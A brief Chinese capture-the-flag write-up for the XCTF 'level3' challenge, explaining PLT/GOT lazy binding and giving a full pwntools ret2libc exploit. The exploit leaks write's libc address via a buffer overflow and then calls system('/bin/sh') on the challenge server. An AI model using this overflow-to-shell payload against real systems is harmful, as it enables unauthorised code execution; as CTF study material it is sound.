level3(xctf)
被plt-got表这一块困扰了很久，结果发现一直没有理解的是pwntools里面的elf.got函数。。
首先是一篇讲解很详细的参考文章
深入了解GOT,PLT和动态链接

总结一下就是：
.plt表指向.got.plt表，由于延迟绑定，.got.plt在函数调用之前指向.plt表，在函数调用之后才写入外部函数具体地址

再就是我一直理解错了的pwntools工具的elf.plt，elf.got函数，两者返回的是.plt表和.got.plt表的地址，而不是其存储的地址。。

题目的具体思路就是：由于level3中没有system以及字符串/bin/sh，需要在给出的libc_32.so.6中寻找。要调用外部函数需要获得其地址。由于外部函数的偏移量是固定的，可以通过泄露write函数的地址来得到偏移。同时返回main函数二次利用漏洞避免外部函数偏移量改变。

from pwn import *
io = remote("220.249.52.133",42977)

level3 = ELF("level3")
libc = ELF("libc_32.so.6")

write_plt_addr = level3.plt['write']
write_got_plt_addr = level3.got['write']
print(hex(write_got_plt_addr))

main_addr = level3.symbols['main']

#返回write的plt表地址，参数分别为1、write_got_plt_addr、4，1表示stdout，即把.got.plt表的内容写入标准输出
payload = 'a'*(0x88+0x04) + p32(write_plt_addr) + p32(main_addr) + p32(1) + p32(write_got_plt_addr) + p32(4)

io.sendlineafter('Input:\n',payload)

#收到标准输出的内容就是write函数的真实地址
write_got_addr = u32(io.recv())

print(hex(write_got_addr))

offset = write_got_addr - libc.symbols['write']

sys_addr = offset + libc.symbols['system']
bin_sh_addr = offset + libc.search('/bin/sh').next()

payload = 'a' * (0x88+0x04) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)

io.sendlineafter('Input:\n',payload)
io.interactive()
